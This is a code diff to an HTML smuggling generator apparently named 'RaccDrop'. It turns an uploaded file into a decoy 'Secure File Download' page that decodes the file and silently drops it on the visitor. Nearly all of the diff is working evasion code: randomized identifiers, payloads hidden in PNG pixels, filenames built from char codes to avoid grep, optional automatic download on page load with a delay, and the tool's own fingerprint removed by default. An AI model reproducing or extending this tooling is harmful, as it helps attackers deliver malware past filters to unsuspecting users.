@@ -67,7 +67,7 @@
     .prompt { color: #00ff00; }
     .label-text { color: #888; font-size: 0.9em; margin-bottom: 4px; display: block; }
 
-    input[type="file"], select, button {
+    input[type="file"], input[type="text"], input[type="number"], select, button {
       width: 100%;
       padding: 10px 12px;
       margin: 6px 0 14px 0;
@@ -80,11 +80,21 @@
       outline: none;
       transition: border-color 0.2s, box-shadow 0.2s;
     }
-    input[type="file"]:focus, select:focus {
+    input[type="file"]:focus, input[type="text"]:focus, input[type="number"]:focus, select:focus {
       border-color: #00ff00;
       box-shadow: 0 0 8px rgba(0,255,0,0.2);
     }
+    input[type="text"]::placeholder { color: #444; }
     select option { background: #111; color: #c0ffc0; }
+
+    .opt-row {
+      display: block;
+      font-size: 0.85em;
+      color: #888;
+      cursor: pointer;
+      margin: 0 0 8px 0;
+    }
+    .opt-row input[type="checkbox"] { accent-color: #00ff00; margin-right: 6px; }
 
     button {
       background: linear-gradient(180deg, #00cc00 0%, #009900 100%);
@@ -186,6 +196,7 @@
       <option value="decimal">Dot-trail the crumbs (Decimal)</option>
       <option value="customb64">Shuffle the paw prints (Custom B64)</option>
       <option value="svg">Bury loot in SVG (SVG stash)</option>
+      <option value="canvas">Stash it in the pixels (PNG carrier)</option>
       <option value="multi">Full trash panda combo (Multi-layer)</option>
     </select>
     <div id="multiOpts">
@@ -200,6 +211,23 @@
       <label><input type="checkbox" class="multiCb" value="decimal"> Decimal</label>
       <label><input type="checkbox" class="multiCb" value="customb64"> Custom B64</label>
     </div>
+
+    <span class="label-text"><span class="prompt">&gt;</span> delivery trigger</span>
+    <select id="trigger">
+      <option value="click">On button click (user gesture)</option>
+      <option value="auto">Automatic on page load</option>
+    </select>
+
+    <span class="label-text"><span class="prompt">&gt;</span> landing page title</span>
+    <input type="text" id="pageTitle" placeholder="Secure File Download" />
+
+    <span class="label-text"><span class="prompt">&gt;</span> delay before delivery (ms)</span>
+    <input type="number" id="delay" min="0" max="60000" step="100" value="0" />
+
+    <label class="opt-row">
+      <input type="checkbox" id="manifestCb" />
+      embed RaccDrop manifest + snippet panel (adds a static fingerprint)
+    </label>
 
     <button onclick="generateHTML()">&gt;&gt; Execute Drop &lt;&lt;</button>
     <p id="status"></p>
@@ -220,10 +248,48 @@
     });
 
     // --- Utility helpers ---
-    const randomKey = (l = 16) =>
-      [...Array(l)].map(() =>
-        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".charAt(Math.floor(Math.random() * 62))
-      ).join('');
+    const KEY_ALPHA = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+
+    // 32 bytes -> AES-256-GCM. Uses CSPRNG, not Math.random.
+    const randomKey = (l = 32) =>
+      [...crypto.getRandomValues(new Uint8Array(l))]
+        .map(b => KEY_ALPHA.charAt(b % 62)).join('');
+
+    // Randomized identifier for the generated payload, so no two builds look alike.
+    // Collisions must be impossible: a duplicate name would emit `const x` twice
+    // and the payload would die with a SyntaxError.
+    const randName = (taken = new Set()) => {
+      let v;
+      do {
+        v = '_' + [...crypto.getRandomValues(new Uint8Array(7))]
+          .map(b => 'abcdefghijklmnopqrstuvwxyz'.charAt(b % 26)).join('');
+      } while (taken.has(v));
+      taken.add(v);
+      return v;
+    };
+
+    // Allocates a set of guaranteed-distinct identifiers.
+    const randNames = (...keys) => {
+      const taken = new Set(), out = {};
+      for (const k of keys) out[k] = randName(taken);
+      return out;
+    };
+
+    // Chunk-safe base64: String.fromCharCode(...arr) throws RangeError past ~65k args.
+    const bytesToB64 = (bytes) => {
+      let s = '';
+      for (let i = 0; i < bytes.length; i += 0x8000) {
+        s += String.fromCharCode.apply(null, bytes.subarray(i, i + 0x8000));
+      }
+      return btoa(s);
+    };
+
+    // Split into chunks so the payload is never one giant string literal.
+    const chunkString = (s, size = 8000) => {
+      const out = [];
+      for (let i = 0; i < s.length; i += size) out.push(s.slice(i, i + size));
+      return out;
+    };
 
     const toHex = str =>
       [...str].map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
@@ -238,15 +304,17 @@
       const enc = new TextEncoder(), iv = crypto.getRandomValues(new Uint8Array(12));
       const k = await crypto.subtle.importKey('raw', enc.encode(key), { name: 'AES-GCM' }, false, ['encrypt']);
       const e = await crypto.subtle.encrypt({ name: 'AES-GCM', iv }, k, enc.encode(data));
-      return btoa(String.fromCharCode(...iv, ...new Uint8Array(e)));
+      const out = new Uint8Array(12 + e.byteLength);
+      out.set(iv, 0);
+      out.set(new Uint8Array(e), 12);
+      return bytesToB64(out);
     }
 
     async function aesDec(data, key) {
-      const raw = atob(data),
-        iv = new Uint8Array([...raw.slice(0, 12)].map(c => c.charCodeAt(0))),
-        encData = new Uint8Array([...raw.slice(12)].map(c => c.charCodeAt(0)));
+      const raw = atob(data), n = raw.length, all = new Uint8Array(n);
+      for (let i = 0; i < n; i++) all[i] = raw.charCodeAt(i);
       const k = await crypto.subtle.importKey('raw', new TextEncoder().encode(key), { name: 'AES-GCM' }, false, ['decrypt']);
-      const dec = await crypto.subtle.decrypt({ name: 'AES-GCM', iv }, k, encData);
+      const dec = await crypto.subtle.decrypt({ name: 'AES-GCM', iv: all.subarray(0, 12) }, k, all.subarray(12));
       return new TextDecoder().decode(dec);
     }
 
@@ -310,6 +378,15 @@
       .replace(/\"/g, '&quot;')
       .replace(/'/g, '&#39;');
 
+    // Escape for embedding inside a double-quoted JS string literal in an inline
+    // <script>. The </ break matters: otherwise the payload can close the tag.
+    const escapeJS = (s) => s
+      .replace(/\\/g, '\\\\')
+      .replace(/\"/g, '\\"')
+      .replace(/\r/g, '\\r')
+      .replace(/\n/g, '\\n')
+      .replace(/<\//g, '<\\/');
+
     function copySnippet(id) {
       const el = document.getElementById(id);
       if (!el) return;
@@ -336,24 +413,114 @@
       }
     }
 
+    // --- PNG pixel carrier ---
+    // Packs raw file bytes into the RGB channels of a PNG and returns it as a data
+    // URL. Storing raw bytes rather than the base64 data URL avoids encoding the
+    // payload twice, which measured ~24% larger output.
+    // Two hard constraints:
+    //   - alpha must stay 255. Canvas stores premultiplied alpha, so any transparent
+    //     pixel makes putImageData/getImageData lossy and corrupts the payload.
+    //   - only R, G and B carry data, so 3 bytes per pixel.
+    // Header is 4 random magic bytes + a 4-byte big-endian length. The magic is
+    // regenerated per build, so the carrier holds no constant signature.
+    function pngCarrier(raw, magic) {
+      const n = raw.length;
+      const need = 8 + n;
+      const px = Math.ceil(need / 3);
+      const w = Math.min(2048, Math.max(1, px));
+      const h = Math.ceil(px / w);
+
+      const bytes = new Uint8Array(w * h * 3);
+      bytes.set(magic, 0);
+      bytes[4] = (n >>> 24) & 255;
+      bytes[5] = (n >>> 16) & 255;
+      bytes[6] = (n >>> 8) & 255;
+      bytes[7] = n & 255;
+      bytes.set(raw, 8);
+
+      const cv = document.createElement('canvas');
+      cv.width = w; cv.height = h;
+      const cx = cv.getContext('2d');
+      const img = cx.createImageData(w, h);
+      const d = img.data;
+      for (let p = 0, b = 0; p < w * h; p++) {
+        d[p * 4] = bytes[b++];
+        d[p * 4 + 1] = bytes[b++];
+        d[p * 4 + 2] = bytes[b++];
+        d[p * 4 + 3] = 255;
+      }
+      cx.putImageData(img, 0, 0);
+      return { url: cv.toDataURL('image/png'), w, h };
+    }
+
+    // Runtime extractor emitted into the generated file. Yields a Uint8Array.
+    function pngExtractor(imgId, magic) {
+      return `await(async()=>{`
+        + `const i=document.getElementById('${imgId}');`
+        + `if(!i.complete)await new Promise(r=>i.addEventListener('load',r,{once:true}));`
+        + `const c=document.createElement('canvas');c.width=i.naturalWidth;c.height=i.naturalHeight;`
+        + `const x=c.getContext('2d',{willReadFrequently:true});x.drawImage(i,0,0);`
+        + `const p=x.getImageData(0,0,c.width,c.height).data,q=c.width*c.height;`
+        + `const b=new Uint8Array(q*3);`
+        + `for(let k=0,j=0;k<q;k++){b[j++]=p[k*4];b[j++]=p[k*4+1];b[j++]=p[k*4+2];}`
+        + `if(b[0]!==${magic[0]}||b[1]!==${magic[1]}||b[2]!==${magic[2]}||b[3]!==${magic[3]})`
+        + `throw new Error('carrier header mismatch');`
+        + `const n=(b[4]<<24)|(b[5]<<16)|(b[6]<<8)|b[7];`
+        + `return b.subarray(8,8+n);})()`;
+    }
+
+    // Char codes for a string, so literals like the filename stay non-greppable.
+    const charCodesOf = (s) => [...s].map(c => c.charCodeAt(0)).join(',');
+
     // --- Build decode chain for generated payload ---
-    function buildDecodeChain(methods, key) {
+    // v = name of the data variable, n = map of randomized identifiers
+    function buildDecodeChain(methods, key, v, n) {
       return methods.map(m => {
         switch (m) {
-          case 'aes': return `d=await(${aesDec.toString()})(d,"${key}");`;
-          case 'xor': return `d=(${xorDec.toString()})(d,"${key}");`;
-          case 'rc4': return `${rc4.toString()}\nd=rc4(atob(d),"${key}");`;
-          case 'hex': return `d=decodeURIComponent(d.replace(/(..)/g,'%$1'));`;
-          case 'base64': return `d=atob(d);`;
-          case 'reverse': return `d=[...d].reverse().join('');`;
-          case 'charcode': return `d=JSON.parse(d).map(c=>String.fromCharCode(c)).join('');`;
-          case 'decimal': return `d=d.split('.').map(n=>String.fromCharCode(+n)).join('');`;
-          case 'customb64': return `const _std='${stdB64}';\n${shuffleAlpha.toString().replace(/stdB64/g,'_std')}\n${customB64Dec.toString().replace(/stdB64/g,'_std')}\nd=customB64Dec(d,"${key}");`;
-          case 'css': return `d=atob(document.getElementById('data').dataset.file);`;
-          case 'svg': return `d=atob(document.getElementById('svgData').dataset.payload);`;
+          case 'aes': return `${v}=await(${aesDec.toString().replace(/aesDec/g, n.aes)})(${v},"${key}");`;
+          case 'xor': return `${v}=(${xorDec.toString()})(${v},"${key}");`;
+          case 'rc4': return `${rc4.toString().replace(/\brc4\b/g, n.rc4)}\n${v}=${n.rc4}(atob(${v}),"${key}");`;
+          case 'hex': return `${v}=decodeURIComponent(${v}.replace(/(..)/g,'%$1'));`;
+          case 'base64': return `${v}=atob(${v});`;
+          case 'reverse': return `${v}=[...${v}].reverse().join('');`;
+          case 'charcode': return `${v}=JSON.parse(${v}).map(c=>String.fromCharCode(c)).join('');`;
+          case 'decimal': return `${v}=${v}.split('.').map(x=>String.fromCharCode(+x)).join('');`;
+          case 'customb64': return `const ${n.std}='${stdB64}';\n${shuffleAlpha.toString().replace(/stdB64/g, n.std).replace(/shuffleAlpha/g, n.shuf)}\n${customB64Dec.toString().replace(/stdB64/g, n.std).replace(/shuffleAlpha/g, n.shuf).replace(/customB64Dec/g, n.cb64)}\n${v}=${n.cb64}(${v},"${key}");`;
+          case 'css': return `${v}=atob(document.getElementById('${n.cssId}').dataset.file);`;
+          case 'svg': return `${v}=atob(document.getElementById('${n.svgId}').dataset.payload);`;
+          case 'canvas': return `${v}=${pngExtractor(n.imgId, n.magic)};`;
           default: return '';
         }
       }).join('\n');
+    }
+
+    // --- Blob-based delivery ---
+    // Converts the decoded data URL to a Blob via Uint8Array instead of assigning
+    // the data URL to a.href. Chrome restricts downloads from large data: URLs, and
+    // this path has no size ceiling.
+    function buildDelivery(v, fileName, n) {
+      return `const ${n.raw}=atob(${v}.slice(${v}.indexOf(',')+1));
+const ${n.arr}=new Uint8Array(${n.raw}.length);
+for(let i=0;i<${n.raw}.length;i++)${n.arr}[i]=${n.raw}.charCodeAt(i);
+const ${n.mime}=(/:(.*?);/.exec(${v})||[,'application/octet-stream'])[1];
+${buildAnchor(n.arr, n.mime, fileName, n)}`;
+    }
+
+    // Delivery straight from a byte array, skipping base64 entirely. Used by the
+    // PNG carrier, which already holds raw bytes.
+    function buildDeliveryBytes(v, fileName, mime, n) {
+      return buildAnchor(v, `String.fromCharCode(${charCodesOf(mime)})`, fileName, n);
+    }
+
+    function buildAnchor(bytesVar, mimeExpr, fileName, n) {
+      return `const ${n.url}=URL.createObjectURL(new Blob([${bytesVar}],{type:${mimeExpr}}));
+const ${n.a}=document.createElement('a');
+${n.a}.href=${n.url};
+${n.a}.download=String.fromCharCode(${charCodesOf(fileName)});
+document.body.appendChild(${n.a});
+${n.a}.click();
+${n.a}.remove();
+setTimeout(()=>URL.revokeObjectURL(${n.url}),3000);`;
     }
 
     // --- Build JS snippet for copy-paste ---
@@ -400,13 +567,18 @@
         }
       }
 
-      return `(${prefix}() => {\n${fnDefs}  let d = "${data}";\n${calls}  const a = document.createElement('a');\n  a.href = d;\n  a.download = '${fileName}';\n  document.body.appendChild(a);\n  a.click();\n  a.remove();\n})();`;
+      const chunks = chunkString(data).map(c => `\n    "${escapeJS(c)}"`).join(',');
+      return `(${prefix}() => {\n${fnDefs}  let d = [${chunks}\n  ].join('');\n${calls}  const raw = atob(d.slice(d.indexOf(',') + 1));\n  const bytes = new Uint8Array(raw.length);\n  for (let i = 0; i < raw.length; i++) bytes[i] = raw.charCodeAt(i);\n  const mime = (/:(.*?);/.exec(d) || [, 'application/octet-stream'])[1];\n  const url = URL.createObjectURL(new Blob([bytes], { type: mime }));\n  const a = document.createElement('a');\n  a.href = url;\n  a.download = ${JSON.stringify(fileName)};\n  document.body.appendChild(a);\n  a.click();\n  a.remove();\n  setTimeout(() => URL.revokeObjectURL(url), 3000);\n})();`;
     }
 
     // --- Main generation function ---
     async function generateHTML() {
       const file = document.getElementById('fileInput').files[0];
       const method = document.getElementById('method').value;
+      const trigger = document.getElementById('trigger').value;
+      const includeManifest = document.getElementById('manifestCb').checked;
+      const pageTitle = document.getElementById('pageTitle').value.trim() || 'Secure File Download';
+      const delay = Math.max(0, Math.min(60000, parseInt(document.getElementById('delay').value, 10) || 0));
       const methodLabel = selectedMethodLabel();
       const stamp = new Date().toISOString();
       const key = randomKey();
@@ -419,6 +591,7 @@
       const reader = new FileReader();
       reader.onload = async () => {
         let data = reader.result; // Data URL string
+        let canvasMime = 'application/octet-stream';
 
         // Determine layers
         let layers = [];
@@ -430,11 +603,28 @@
           }
         }
 
+        // Randomized identifiers for this build, guaranteed distinct
+        const n = randNames(
+          'data', 'raw', 'arr', 'mime', 'url', 'a', 'aes', 'rc4',
+          'std', 'shuf', 'cb64', 'cssId', 'svgId', 'imgId', 'btn'
+        );
+        // Per-build carrier header, so the PNG holds no constant signature
+        n.magic = [...crypto.getRandomValues(new Uint8Array(4))];
+
         // Apply encoding
         if (method === 'css') {
-          data = '<div id="data" data-file="' + btoa(data) + '"></div>';
+          data = '<div id="' + n.cssId + '" data-file="' + btoa(data) + '"></div>';
         } else if (method === 'svg') {
-          data = '<svg id="svgData" xmlns="http://www.w3.org/2000/svg" style="display:none" data-payload="' + btoa(data) + '"></svg>';
+          data = '<svg id="' + n.svgId + '" xmlns="http://www.w3.org/2000/svg" style="display:none" data-payload="' + btoa(data) + '"></svg>';
+        } else if (method === 'canvas') {
+          const comma = data.indexOf(',');
+          canvasMime = (/:(.*?);/.exec(data) || [, 'application/octet-stream'])[1];
+          const b = atob(data.slice(comma + 1));
+          const rawBytes = new Uint8Array(b.length);
+          for (let i = 0; i < b.length; i++) rawBytes[i] = b.charCodeAt(i);
+          const c = pngCarrier(rawBytes, n.magic);
+          data = '<img id="' + n.imgId + '" width="' + c.w + '" height="' + c.h
+            + '" style="position:absolute;left:-9999px;width:1px;height:1px" alt="" src="' + c.url + '">';
         } else if (method === 'multi') {
           for (const m of layers) {
             data = await encodeData(data, m, key);
@@ -444,26 +634,27 @@
         }
 
         // Build decode chain
-        let decodeChain;
-        if (method === 'css') {
-          decodeChain = 'd=atob(document.getElementById(\'data\').dataset.file);';
-        } else if (method === 'svg') {
-          decodeChain = 'd=atob(document.getElementById(\'svgData\').dataset.payload);';
-        } else {
-          const decodeMethods = method === 'multi' ? [...layers].reverse() : [method];
-          decodeChain = buildDecodeChain(decodeMethods, key);
-        }
+        const decodeMethods = method === 'css' ? ['css']
+          : method === 'svg' ? ['svg']
+          : method === 'canvas' ? ['canvas']
+          : method === 'multi' ? [...layers].reverse()
+          : [method];
+        const decodeChain = buildDecodeChain(decodeMethods, key, n.data, n);
 
         // Build copy/paste snippets
         let htmlSnippet = '';
         let jsSnippet = '';
 
-        if (method === 'css') {
+        if (method === 'css' || method === 'svg' || method === 'canvas') {
           htmlSnippet = data;
-          jsSnippet = `(() => {\n  const d = atob(document.getElementById('data').dataset.file);\n  const a = document.createElement('a');\n  a.href = d;\n  a.download = '${file.name}';\n  document.body.appendChild(a);\n  a.click();\n  a.remove();\n})();`;
-        } else if (method === 'svg') {
-          htmlSnippet = data;
-          jsSnippet = `(() => {\n  const d = atob(document.getElementById('svgData').dataset.payload);\n  const a = document.createElement('a');\n  a.href = d;\n  a.download = '${file.name}';\n  document.body.appendChild(a);\n  a.click();\n  a.remove();\n})();`;
+          if (method === 'canvas') {
+            jsSnippet = `(async () => {\n  const bytes = ${pngExtractor(n.imgId, n.magic)};\n  const url = URL.createObjectURL(new Blob([bytes], { type: ${JSON.stringify(canvasMime)} }));\n  const a = document.createElement('a');\n  a.href = url;\n  a.download = ${JSON.stringify(file.name)};\n  document.body.appendChild(a);\n  a.click();\n  a.remove();\n  setTimeout(() => URL.revokeObjectURL(url), 3000);\n})();`;
+          } else {
+            const src = method === 'css'
+              ? `atob(document.getElementById('${n.cssId}').dataset.file)`
+              : `atob(document.getElementById('${n.svgId}').dataset.payload)`;
+            jsSnippet = `(() => {\n  const d = ${src};\n  const raw = atob(d.slice(d.indexOf(',') + 1));\n  const bytes = new Uint8Array(raw.length);\n  for (let i = 0; i < raw.length; i++) bytes[i] = raw.charCodeAt(i);\n  const mime = (/:(.*?);/.exec(d) || [, 'application/octet-stream'])[1];\n  const url = URL.createObjectURL(new Blob([bytes], { type: mime }));\n  const a = document.createElement('a');\n  a.href = url;\n  a.download = ${JSON.stringify(file.name)};\n  document.body.appendChild(a);\n  a.click();\n  a.remove();\n  setTimeout(() => URL.revokeObjectURL(url), 3000);\n})();`;
+          }
         } else if (method === 'multi') {
           htmlSnippet = '<!-- No extra HTML needed for Multi-layer method -->';
           jsSnippet = buildJsSnippet(layers, data, key, file.name);
@@ -475,36 +666,40 @@
         const htmlSnippetEsc = escapeHTML(htmlSnippet);
         const jsSnippetEsc = escapeHTML(jsSnippet);
 
-        // Escape data for inline script embedding
-        const escapedData = data
-          .replace(/\\/g, '\\\\')
-          .replace(/'/g, "\\'")
-          .replace(/\"/g, '\\"');
+        // For css/svg/canvas the payload lives in the DOM element, so the data
+        // variable starts empty instead of embedding the whole payload a second time.
+        const domBased = method === 'css' || method === 'svg' || method === 'canvas';
+        const payloadMarkup = domBased ? data : '';
+        const dataLiteral = domBased
+          ? "''"
+          : '[' + chunkString(data).map(c => `"${escapeJS(c)}"`).join(',') + "].join('')";
 
         // Method description for manifest
         const methodDesc = method === 'multi' ? `Multi-layer [${layers.join(' > ')}]` : `${methodLabel} (${method})`;
 
-        // Panel HTML for generated payload
-        const embeddedPanel = `\n<div style="font-family:monospace;background:#0a0a0a;color:#c0ffc0;border:1px solid #1a3a1a;border-radius:4px;padding:12px;margin:10px 0;">\n  <div style="color:#666;font-size:0.9em;"><strong style="color:#00ff00;">Method:</strong> ${methodDesc}</div>\n  <p style="color:#666;font-size:0.85em;">Copy & paste these snippets to reconstruct and download the original file.</p>\n  <h3 style="color:#00ff00;font-size:0.9em;">HTML payload</h3>\n  <pre style="background:#111;border:1px solid #1a3a1a;border-radius:4px;padding:8px;overflow:auto;max-height:200px;"><code>${htmlSnippetEsc}</code></pre>\n  <h3 style="color:#00ff00;font-size:0.9em;">JavaScript</h3>\n  <pre style="background:#111;border:1px solid #1a3a1a;border-radius:4px;padding:8px;overflow:auto;max-height:200px;"><code>${jsSnippetEsc}</code></pre>\n</div>`;
+        // Delivery body, optionally gated behind a user gesture. Some browsers only
+        // honour a programmatic download that originates from a real click.
+        const delivery = method === 'canvas'
+          ? buildDeliveryBytes(n.data, file.name, canvasMime, n)
+          : buildDelivery(n.data, file.name, n);
+        const wait = delay > 0 ? `await new Promise(r=>setTimeout(r,${delay}));\n` : '';
+        const runner = trigger === 'click'
+          ? `document.getElementById('${n.btn}').addEventListener('click',async()=>{\n${wait}let ${n.data}=${dataLiteral};\n${decodeChain}\n${delivery}\n});`
+          : `(async()=>{\n${wait}let ${n.data}=${dataLiteral};\n${decodeChain}\n${delivery}\n})();`;
 
-        // Generated self-contained HTML payload
-        const genHTML = `<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  <title>RaccDrop Payload</title>
-  <meta name="raccdrop-method" content="${method}">
+        const pageBody = trigger === 'click'
+          ? `<div class="card">\n  <h1>Your download is ready</h1>\n  <p>Click the button below to save the file.</p>\n  <button id="${n.btn}" class="btn">Download</button>\n</div>`
+          : `<div class="card">\n  <h1>Preparing your download&hellip;</h1>\n  <p>If the download does not start automatically, check your browser prompts.</p>\n</div>`;
+
+        // Self-identifying metadata, off by default: the manifest, the raccdrop-*
+        // meta tags and the snippet panel are a strong static fingerprint.
+        const manifest = includeManifest ? `  <meta name="raccdrop-method" content="${method}">
   <meta name="raccdrop-method-label" content="${methodLabel}">
   <meta name="raccdrop-filename" content="${file.name}">
   <meta name="raccdrop-generated" content="${stamp}">
-  <style>
-    body { font-family: monospace; background: #0a0a0a; color: #c0ffc0; padding: 1rem; }
-    pre { background:#111; border:1px solid #1a3a1a; border-radius:4px; padding:10px; overflow:auto; max-height:300px; }
-    code { font-family: inherit; font-size:0.9em; }
-  </style>
-</head>
-<body>
-<!--
+` : '';
+
+        const manifestComment = includeManifest ? `<!--
   RaccDrop Manifest
   -----------------
   Method: ${methodDesc}
@@ -512,18 +707,33 @@
   Generated (ISO): ${stamp}
   Key: ${key}
 -->
-${data}
+` : '';
+
+        const embeddedPanel = includeManifest ? `\n<div style="font-family:monospace;background:#0a0a0a;color:#c0ffc0;border:1px solid #1a3a1a;border-radius:4px;padding:12px;margin:10px 0;">\n  <div style="color:#666;font-size:0.9em;"><strong style="color:#00ff00;">Method:</strong> ${methodDesc}</div>\n  <p style="color:#666;font-size:0.85em;">Copy &amp; paste these snippets to reconstruct and download the original file.</p>\n  <h3 style="color:#00ff00;font-size:0.9em;">HTML payload</h3>\n  <pre style="background:#111;border:1px solid #1a3a1a;border-radius:4px;padding:8px;overflow:auto;max-height:200px;"><code>${htmlSnippetEsc}</code></pre>\n  <h3 style="color:#00ff00;font-size:0.9em;">JavaScript</h3>\n  <pre style="background:#111;border:1px solid #1a3a1a;border-radius:4px;padding:8px;overflow:auto;max-height:200px;"><code>${jsSnippetEsc}</code></pre>\n</div>` : '';
+
+        // Generated self-contained HTML payload
+        const genHTML = `<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <title>${escapeHTML(pageTitle)}</title>
+${manifest}  <style>
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{font-family:'Segoe UI',system-ui,sans-serif;background:#f5f5f5;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
+    .card{background:#fff;border-radius:8px;padding:48px 40px;max-width:520px;width:100%;box-shadow:0 2px 8px rgba(0,0,0,.12)}
+    h1{font-size:20px;font-weight:600;color:#333;margin-bottom:16px}
+    p{font-size:14px;color:#555;line-height:1.6;margin-bottom:28px}
+    .btn{padding:12px 28px;background:#2ecc71;color:#fff;font-size:14px;font-weight:600;border:none;border-radius:4px;cursor:pointer}
+    .btn:hover{opacity:.9}
+  </style>
+</head>
+<body>
+${manifestComment}${payloadMarkup}
+${pageBody}
 <script>
-(async()=>{
-let d="${escapedData}";
-${decodeChain}
-const l=document.createElement('a');
-l.href=d;
-l.download='${file.name}';
-document.body.appendChild(l);
-l.click();
-l.remove();
-})();<\/script>
+${runner}
+<\/script>
 ${embeddedPanel}
 </body>
 </html>`;
